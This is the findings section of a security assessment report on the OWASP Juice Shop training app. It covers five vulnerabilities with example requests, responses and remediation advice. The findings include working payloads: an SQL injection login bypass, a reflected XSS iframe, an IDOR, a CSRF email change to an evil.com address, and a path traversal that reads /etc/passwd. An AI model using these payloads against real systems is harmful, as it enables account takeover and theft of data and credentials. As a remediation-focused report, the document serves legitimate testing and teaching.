3. Vulnerability Findings

SQL Injection — Authentication Bypass
ID: VSC-2026-001  |  CWE-89  |  CVSSv3: 9.8
Critical
EndpointPOST /rest/user/login
Parameteremail
MethodPOST
CVSS Score9.8 (Critical)
Description

The email parameter in the login endpoint is vulnerable to SQL Injection. An attacker can craft a malicious payload to bypass authentication and gain unauthorized access as any user, including admin.

Request
POST /rest/user/login HTTP/1.1 Host: juice-shop:3000 Content-Type: application/json { "email": "' OR 1=1--", "password": "anything" }
Response
HTTP/1.1 200 OK { "authentication": { "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...", "umail": "admin@juice-sh.op", "bid": 1 } }
Remediation

Use parameterized queries or an ORM. Never concatenate user input directly into SQL queries. Implement input validation and allowlisting.

Insecure Direct Object Reference (IDOR) — User Data Access
ID: VSC-2026-002  |  CWE-639  |  CVSSv3: 8.1
High
EndpointGET /api/Users/{id}
Parameterid (path)
MethodGET
CVSS Score8.1 (High)
Description

The API does not enforce object-level authorization. An authenticated user can access any other user's data by incrementing the id path parameter, exposing PII including email, password hash, and personal details.

Request
GET /api/Users/2 HTTP/1.1 Host: juice-shop:3000 Authorization: Bearer <token_of_user_1>
Response
HTTP/1.1 200 OK { "id": 2, "username": "mc.safesearch", "email": "mc.safesearch@juice-sh.op", "password": "b03f4b0ba8b458fa0acdc02cfd48f9df" }
Remediation

Implement object-level authorization checks on every request. Validate that the authenticated user has permission to access the requested resource.

Cross-Site Scripting (XSS) — Reflected
ID: VSC-2026-003  |  CWE-79  |  CVSSv3: 6.1
Medium
EndpointGET /search
Parameterq (query string)
MethodGET
CVSS Score6.1 (Medium)
Description

The search parameter q is reflected in the response without proper sanitization, allowing injection of arbitrary HTML/JavaScript. An attacker can steal session cookies or redirect users to malicious sites.

Payload
GET /search?q=<iframe src="javascript:alert(`xss`)"> HTTP/1.1 Host: juice-shop:3000
Response
HTTP/1.1 200 OK ... <div class="search-result"> Results for: <iframe src="javascript:alert(`xss`)"></iframe> </div>
Remediation

Encode all user-supplied data before rendering in HTML. Implement a Content Security Policy (CSP) header. Use a templating engine with auto-escaping enabled.

Cross-Site Request Forgery (CSRF) — Profile Update
ID: VSC-2026-004  |  CWE-352  |  CVSSv3: 6.5
Medium
EndpointPUT /api/Users/1
Parameteremail (body)
MethodPUT
CVSS Score6.5 (Medium)
Description

The user profile update endpoint accepts state-changing PUT requests without validating a CSRF token. An attacker can trick an authenticated victim into submitting a forged request that modifies their account data.

Request (no CSRF token)
PUT /api/Users/1 HTTP/1.1 Host: juice-shop:3000 Content-Type: application/json { "email": "attacker@evil.com" }
Response
HTTP/1.1 200 OK { "status": "success", "data": { "email": "attacker@evil.com" } }
Remediation

Implement CSRF tokens (synchronizer token pattern) on all state-changing operations. Validate the Origin and Referer headers. Use SameSite cookie attribute.

Path Traversal — Arbitrary File Read
ID: VSC-2026-005  |  CWE-22  |  CVSSv3: 5.9
Medium
EndpointGET /ftp
Parameterpath (query string)
MethodGET
CVSS Score5.9 (Medium)
Description

The file download endpoint does not sanitize the path parameter. An attacker can use directory traversal sequences to read arbitrary files outside the intended directory, including sensitive server files.

Payload
GET /ftp?path=../../../../etc/passwd HTTP/1.1 Host: juice-shop:3000
Response
HTTP/1.1 200 OK root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...
Remediation

Validate and canonicalize file paths before use. Use an allowlist of permitted directories. Never expose raw filesystem paths to user input.
